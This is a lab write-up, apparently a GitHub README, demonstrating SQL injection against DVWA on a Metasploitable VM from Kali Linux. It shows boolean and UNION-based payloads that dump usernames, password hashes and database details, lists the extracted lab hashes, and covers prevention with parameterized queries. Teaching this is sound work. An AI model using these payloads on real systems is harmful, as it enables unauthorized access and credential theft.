# SQL Injection Demonstration on DVWA - Metasploitable Target

**Author:** NyxTheDark  
**GitHub:** [https://github.com/NyxTheDark](https://github.com/NyxTheDark)  
**Target:** Metasploitable VM (192.168.29.215)  
**Attacker:** Kali Linux  

## Overview

This project demonstrates SQL injection vulnerabilities using the Damn Vulnerable Web Application (DVWA) running on a Metasploitable virtual machine. The demonstration showcases how SQL injection attacks work in a controlled penetration testing environment using Kali Linux as the attacking platform.

## 📸 Visual Demonstration

### Lab Environment Setup

![Metasploitable VM](screenshots/01_metasploitable_vm.png)
*Metasploitable VM running and configured*

![Kali Linux Setup](screenshots/02_kali_linux_setup.png)
*Kali Linux penetration testing environment*

![Network Connectivity](screenshots/03_network_connectivity.png)
*Network connectivity test from Kali to Metasploitable*

### DVWA Access and Configuration

![DVWA Login](screenshots/04_dvwa_login.png)
*DVWA login page on Metasploitable (192.168.29.215)*

![Security Settings](screenshots/05_security_settings.png)
*DVWA security level configured to "Low"*

### SQL Injection Attack Demonstration

![SQL Injection Page](screenshots/06_sql_injection_page.png)
*DVWA SQL Injection vulnerability testing interface*

![Basic Injection Test](screenshots/07_basic_injection_test.png)
*SQL injection attack demonstration with results*

## 🔍 Attack Demonstration

### Target Environment
- **Target:** Metasploitable VM (192.168.29.215)
- **Application:** DVWA (Damn Vulnerable Web Application)
- **Vulnerability:** SQL Injection in User ID parameter
- **Security Level:** Low (no input validation)

### Attack Vectors Demonstrated

1. **Boolean-based SQL Injection**
   ```sql
   1' OR '1'='1
   ```
   - Bypasses authentication logic
   - Returns all user records instead of just one

2. **UNION-based SQL Injection**
   ```sql
   1' UNION SELECT user,password FROM users --
   ```
   - Extracts sensitive data from the database
   - Reveals usernames and password hashes

3. **Database Information Extraction**
   ```sql
   1' UNION SELECT version(),database() --
   ```
   - Reveals database version and name
   - Helps with further exploitation planning

## 🤖 Automated Exploitation

### Running the Exploit Script

The included `sql_injection_exploit.sh` script automates the SQL injection process:

```bash
# Make the script executable
chmod +x sql_injection_exploit.sh

# Run the automated exploit
./sql_injection_exploit.sh
```

### Script Features
- Automated login to DVWA
- Multiple SQL injection payload testing
- Database enumeration
- User credential extraction
- Results logging and reporting

## 📊 Results and Impact

### Vulnerability Impact
The SQL injection vulnerability allows attackers to:
- **Bypass authentication** mechanisms
- **Extract sensitive data** including user credentials
- **Enumerate database structure** and contents
- **Access unauthorized information**

### Extracted Data Example
```
Database: dvwa
User Credentials Extracted:
- admin: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
- gordonb: e99a18c428cb38d5f260853678922e03
- 1337: 8d3533d75ae2c3966d7e0d4fcc69216b
- pablo: 0d107d09f5bbe40cade3de5c71e9e9b7
- smithy: 5f4dcc3b5aa765d61d8327deb882cf99
```

## 🔒 Prevention

### Secure Coding Practices
1. **Use Parameterized Queries**
   ```php
   $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
   $stmt->execute([$user_id]);
   ```

2. **Input Validation**
   ```php
   $id = filter_var($_GET['id'], FILTER_VALIDATE_INT);
   ```

3. **Escape Special Characters**
   ```php
   $id = mysqli_real_escape_string($connection, $_GET['id']);
   ```

## ⚠️ Legal and Ethical Notice

This demonstration is for **educational purposes only**. Only perform these tests on systems you own or have explicit permission to test. Always ensure compliance with local laws and regulations.

## 📁 Project Files

```
SQL Injection/
├── sql_injection_exploit.sh     # Automated exploitation script
├── README.md                     # This documentation
└── screenshots/                  # Visual proof of concept
    ├── 01_metasploitable_vm.png
    ├── 02_kali_linux_setup.png
    ├── 03_network_connectivity.png
    ├── 04_dvwa_login.png
    ├── 05_security_settings.png
    ├── 06_sql_injection_page.png
    └── 07_basic_injection_test.png
```

---

**Remember**: Use this knowledge responsibly and ethically. Always obtain proper authorization before testing security vulnerabilities.
